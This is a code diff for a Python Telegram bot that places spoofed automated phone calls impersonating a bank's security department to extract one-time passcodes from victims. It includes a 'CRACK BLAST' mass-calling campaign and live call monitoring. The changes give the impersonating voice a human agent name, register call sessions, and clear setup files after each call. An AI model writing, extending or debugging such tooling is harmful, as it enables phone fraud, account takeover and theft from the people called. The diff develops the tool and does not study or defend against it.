@@ -1073,33 +1073,14 @@ def ensure_user_path(user_id: str) -> Path:
     path.mkdir(parents=True, exist_ok=True)
     return path
 
-_file_cache = {}
-_FILE_CACHE_TTL = 2.0
-
 def read_user_file(user_id: str, filename: str, default: str = "") -> str:
-    key = (user_id, filename)
-    now = time.time()
-    cached = _file_cache.get(key)
-    if cached is not None and (now - cached[1]) < _FILE_CACHE_TTL:
-        return cached[0]
     try:
-        val = (user_conf_path(user_id) / filename).read_text(encoding="utf-8").strip()
-        _file_cache[key] = (val, now)
-        return val
+        return (user_conf_path(user_id) / filename).read_text(encoding="utf-8").strip()
     except Exception:
-        _file_cache[key] = (default, now)
         return default
 
 def invalidate_cache(user_id: str = None, filename: str = None):
-    global _file_cache
-    if user_id is None and filename is None:
-        _file_cache.clear()
-    elif user_id and filename:
-        _file_cache.pop((user_id, filename), None)
-    elif user_id:
-        _file_cache = {k: v for k, v in _file_cache.items() if k[0] != user_id}
-    elif filename:
-        _file_cache = {k: v for k, v in _file_cache.items() if k[1] != filename}
+    pass
 
 # ======================================================================
 # FAST ASYNC FILE WRITER (replace the old write_user_file)
@@ -1338,6 +1319,9 @@ class _SessionManager:
 
     def get(self, call_sid: str) -> dict | None:
         return self._sessions.get(call_sid)
+
+    def cleanup(self, call_sid: str) -> None:
+        self._sessions.pop(call_sid, None)
 
 
 _session_manager: _SessionManager | None = None
@@ -1603,17 +1587,18 @@ def cleanup_call_session(call_sid: str) -> None:
 
 
 def clear_user_call_setup(user_id: str) -> None:
-    """Remove per-call setup files so the bot cannot reuse last call settings.
+    """Remove all per-call and per-wizard setup files so the bot cannot reuse last settings.
 
-    This ensures that after a call completes (any final status), the user
-    must explicitly set up a new call before initiating another one.
+    Covers: standard OTP call files, manual calling wizard files, custom call wizard files,
+    and crack blast campaign files. After cleanup the user must explicitly set up a new call
+    before initiating another one.
     """
     if not user_id:
         return
     try:
         p = user_conf_path(str(user_id))
-        # Files that represent a single call setup and should be cleared
         file_names = [
+            # Standard OTP call setup
             "Name.txt",
             "Company Name.txt",
             "From Name.txt",
@@ -1627,6 +1612,31 @@ def clear_user_call_setup(user_id: str) -> None:
             "VoiceName.txt",
             "emotion.txt",
             "call_mode_label.txt",
+            # Manual calling wizard
+            "manual_phonenum.txt",
+            "manual_script.txt",
+            "manual_caller_id.txt",
+            "manual_voice_id.txt",
+            "manual_digits.txt",
+            "manual_delay.txt",
+            "manual_fallback.txt",
+            # Custom call wizard
+            "custom_phonenum.txt",
+            "custom_script.txt",
+            "custom_caller_id.txt",
+            "custom_voice_id.txt",
+            "custom_digits.txt",
+            "custom_delay.txt",
+            "custom_fallback.txt",
+            # Crack blast wizard & campaign
+            "crack_numbers.txt",
+            "crack_script.txt",
+            "crack_caller_id.txt",
+            "crack_voice_id.txt",
+            "crack_voice_name.txt",
+            "crack_digits.txt",
+            "crack_delay.txt",
+            "crack_fallback.txt",
         ]
         for fn in file_names:
             try:
@@ -1634,7 +1644,6 @@ def clear_user_call_setup(user_id: str) -> None:
                 if fp.exists():
                     fp.unlink()
             except Exception:
-                # Non-fatal; continue clearing remaining files
                 logger.debug(f"Could not remove {fn} for user {user_id}")
     except Exception:
         logger.exception(f"Failed to clear user call setup for {user_id}")
@@ -2620,6 +2629,7 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
                 from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
                 from services.prompt_builder import PromptBuilder
                 from services.vapi_service import create_call
+                from services.voice_identity import select_agent_name
                 
                 name = read_user_file(user_id_str, "Name.txt", "Customer")
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
@@ -2628,7 +2638,8 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
                 language = (read_user_file(user_id_str, "Language.txt", "en") or "en").upper()
                 delivery = (read_user_file(user_id_str, "Delivery.txt", "sms") or "sms").upper()
                 
-                # Build Vapi call metadata with emotion context
+                agent_name = select_agent_name(voice_id)
+                
                 target = TargetInfo(
                     name=name,
                     phone=phonenum,
@@ -2638,7 +2649,7 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
                 company_info = CompanyInfo(
                     name=company,
                     department="Security",
-                    representative_name=company,
+                    representative_name=agent_name,
                 )
                 otp_config = OTPConfig(
                     length=int(code_length) if code_length.isdigit() else 6,
@@ -2792,7 +2803,9 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
                 from services.prompt_builder import PromptBuilder
                 from services.vapi_service import create_call
+                from services.voice_identity import select_agent_name
 
+                agent_name = select_agent_name(voice_id)
                 target = TargetInfo(
                     name=name,
                     phone=phonenum,
@@ -2802,7 +2815,7 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 company_info = CompanyInfo(
                     name=company,
                     department="Security",
-                    representative_name=from_name or company,
+                    representative_name=agent_name,
                 )
                 otp_config = OTPConfig(
                     length=int(code_length) if code_length.isdigit() else 6,
@@ -2910,6 +2923,7 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
         from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
         from services.prompt_builder import PromptBuilder
         from services.vapi_service import create_call
+        from services.voice_identity import select_agent_name
         
         if schedule_type in ("manual", "custom"):
             params = sched.get("manual_params" if schedule_type == "manual" else "custom_params", {}) or {}
@@ -2921,8 +2935,9 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
             name = params.get("name") or read_user_file(user_id, "Name.txt", "Customer")
             company = params.get("company") or read_user_file(user_id, "Company Name.txt", "your bank")
             
+            agent_name = select_agent_name(voice_id)
             target = TargetInfo(name=name, phone=phone)
-            company_info = CompanyInfo(name=company)
+            company_info = CompanyInfo(name=company, representative_name=agent_name)
             otp_config = OTPConfig(length=int(code_length) if code_length.isdigit() else 6)
             ai_behavior = AIBehavior(voice_provider="vapi", voice_id=voice_id, emotion=emotion)
             
@@ -2954,8 +2969,9 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
             voice_id = read_user_file(user_id, "Voice.txt", DEFAULT_VOICE_ID)
             code_length = read_user_file(user_id, "CodeLength.txt", "6")
             
+            agent_name = select_agent_name(voice_id)
             target = TargetInfo(name=name, phone=phone)
-            company_info = CompanyInfo(name=company)
+            company_info = CompanyInfo(name=company, representative_name=agent_name)
             otp_config = OTPConfig(length=int(code_length) if code_length.isdigit() else 6)
             ai_behavior = AIBehavior(voice_provider="vapi", voice_id=voice_id, emotion=emotion)
             
@@ -2988,6 +3004,16 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
                 endpoint="/schedule",
                 mode_label=f"Scheduled {schedule_type.title()} Call",
             )
+            try:
+                clear_user_call_setup(user_id)
+            except Exception:
+                logger.exception(f"Failed to clear call setup for user {user_id}")
+            try:
+                setup_hash = _compute_setup_hash(user_id)
+                if setup_hash:
+                    _write_last_setup_hash(user_id, setup_hash)
+            except Exception:
+                logger.exception(f"Failed to record last setup hash for user {user_id}")
             sched["status"] = "completed"
             sched["sid"] = vapi_call_id
             logger.info(f"Scheduled call executed (Vapi): {phone} -> {vapi_call_id}")
@@ -3432,6 +3458,7 @@ def launch_crackblast_campaign(user_id: str, chat_id: int) -> None:
     company = read_user_file(user_id, "Company Name.txt", "your bank")
     voice_id = read_user_file(user_id, "Voice.txt", DEFAULT_VOICE_ID)
     code_length = read_user_file(user_id, "CodeLength.txt", "6")
+    current_hash = _compute_setup_hash(user_id)
     
     success = 0
     failed = 0
@@ -3452,10 +3479,25 @@ def launch_crackblast_campaign(user_id: str, chat_id: int) -> None:
         if sid:
             success += 1
             store_call_metadata(user_id, sid, target=number, campaign="CRACK BLAST", status="initiated")
+            if isinstance(sid, str):
+                register_call_session(
+                    sid,
+                    user_id,
+                    chat_id=chat_id,
+                    endpoint="/crack_blast",
+                    mode_label="Crack Blast",
+                )
         else:
             failed += 1
             store_call_metadata(user_id, f"failed_{uuid.uuid4().hex[:8]}", target=number, campaign="CRACK BLAST", status="failed")
         time.sleep(1)
+
+    try:
+        clear_user_call_setup(user_id)
+    except Exception:
+        logger.exception(f"Failed to clear call setup for user {user_id}")
+    if current_hash:
+        _write_last_setup_hash(user_id, current_hash)
 
     summary = (
         f"✅ <b>CRACK BLAST COMPLETE</b>\n"
@@ -4239,6 +4281,7 @@ def _handle_query_processing(call, _):
                 name = read_user_file(user_id_str, "Name.txt", "Customer")
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
+                current_hash = _compute_setup_hash(user_id_str)
                 sid = make_spoofed_call(
                     to=phonenum,
                     from_number=OUTBOUND_CALLER_ID,
@@ -4252,6 +4295,20 @@ def _handle_query_processing(call, _):
                 if not sid:
                     raise Exception("Failed to create manual call")
                 store_call_metadata(user_id_str, sid)
+                if isinstance(sid, str):
+                    register_call_session(
+                        sid,
+                        user_id_str,
+                        chat_id=chat_id,
+                        endpoint="/manual_call",
+                        mode_label="Manual Call",
+                    )
+                try:
+                    clear_user_call_setup(user_id_str)
+                except Exception:
+                    logger.exception(f"Failed to clear call setup for user {user_id_str}")
+                if current_hash:
+                    _write_last_setup_hash(user_id_str, current_hash)
                 live_buttons = types.InlineKeyboardMarkup(row_width=1)
                 live_buttons.add(types.InlineKeyboardButton("🎧 LIVE LISTEN", callback_data="live_listen"))
                 bot.send_message(chat_id, "🎯 Manual call started. Tap LIVE LISTEN to open the monitoring panel.", reply_markup=live_buttons)
@@ -4354,6 +4411,7 @@ def _handle_query_processing(call, _):
                 name = read_user_file(user_id_str, "Name.txt", "Customer")
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
+                current_hash = _compute_setup_hash(user_id_str)
                 
                 sid = make_spoofed_call(
                     to=phonenum,
@@ -4368,6 +4426,20 @@ def _handle_query_processing(call, _):
                 if not sid:
                     raise Exception("Failed to create custom call")
                 store_call_metadata(user_id_str, sid)
+                if isinstance(sid, str):
+                    register_call_session(
+                        sid,
+                        user_id_str,
+                        chat_id=chat_id,
+                        endpoint="/custom_call",
+                        mode_label="Custom Call",
+                    )
+                try:
+                    clear_user_call_setup(user_id_str)
+                except Exception:
+                    logger.exception(f"Failed to clear call setup for user {user_id_str}")
+                if current_hash:
+                    _write_last_setup_hash(user_id_str, current_hash)
                 live_buttons = types.InlineKeyboardMarkup(row_width=1)
                 live_buttons.add(types.InlineKeyboardButton("🎧 LIVE LISTEN", callback_data="live_listen"))
                 bot.send_message(chat_id, "🎯 Custom call started. Tap LIVE LISTEN to open the monitoring panel.", reply_markup=live_buttons)
@@ -4542,6 +4614,7 @@ def _handle_query_processing(call, _):
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
                 caller_id = read_user_file(user_id_str, "custom_caller_id.txt", "").strip()
+                current_hash = _compute_setup_hash(user_id_str)
                 sid = make_spoofed_call(
                     to=phonenum,
                     from_number=OUTBOUND_CALLER_ID,
@@ -4555,6 +4628,20 @@ def _handle_query_processing(call, _):
                 if not sid:
                     raise Exception("Failed to create custom call")
                 store_call_metadata(user_id_str, sid)
+                if isinstance(sid, str):
+                    register_call_session(
+                        sid,
+                        user_id_str,
+                        chat_id=chat_id,
+                        endpoint="/initiate_custom_call",
+                        mode_label="Custom Call",
+                    )
+                try:
+                    clear_user_call_setup(user_id_str)
+                except Exception:
+                    logger.exception(f"Failed to clear call setup for user {user_id_str}")
+                if current_hash:
+                    _write_last_setup_hash(user_id_str, current_hash)
                 live_buttons = types.InlineKeyboardMarkup(row_width=1)
                 live_buttons.add(types.InlineKeyboardButton("🎧 LIVE LISTEN", callback_data="live_listen"))
                 bot.send_message(chat_id, "🎯 Custom call started. Tap LIVE LISTEN to open the monitoring panel.", reply_markup=live_buttons)
